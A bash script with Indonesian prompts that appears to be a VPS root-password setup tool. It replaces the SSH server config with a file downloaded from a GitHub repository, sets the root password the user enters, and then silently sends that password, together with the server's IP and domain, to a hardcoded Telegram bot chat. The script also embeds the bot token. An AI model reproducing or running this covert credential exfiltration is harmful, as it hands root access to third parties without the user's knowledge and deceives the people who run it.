#!/bin/bash
#echo "$tarapkuhing    ALL=(ALL:ALL) ALL" >> /etc/sudoers;
wget -qO- -O /etc/ssh/sshd_config https://raw.githubusercontent.com/Tarap-Kuhing/v/main/sshd_config;
systemctl restart sshd;
clear;
echo -e "Masukkan Password:";
read -e pwe;
usermod -p `perl -e "print crypt("$pwe","Q4")"` root;
clear;
printf "Mohon Simpan Informasi Akun VPS Ini
============================================
Akun Root (Akun Utama)
Ip address = $(curl -Ls http://ipinfo.io/ip)
Username   = root
Password   = $pwe
============================================"
CHATID="5716954563"
KEY="6379535129:AAGfTsJgiZwaUZRPz_DiF5HOv7qMJMdRHeY"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="
<code>◇━━━━━━━━━━━━━━◇</code>
<b>   ⚠️BACKUP NOTIF⚠️</b>
<b>     Detail ganti pw VPS</b>
<code>◇━━━━━━━━━━━━━━◇</code>
<b>IP VPS  :</b> <code>${IP} </code>
<b>DOMAIN :</b> <code>${domain}</code>
<b>Tanggal : $date</b>
<b>NEW PW :</b> <code>{$pwe} </code>
<code>◇━━━━━━━━━━━━━━◇</code>
<code>BY BOT : @WokszXD</code>
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo "";
exit;
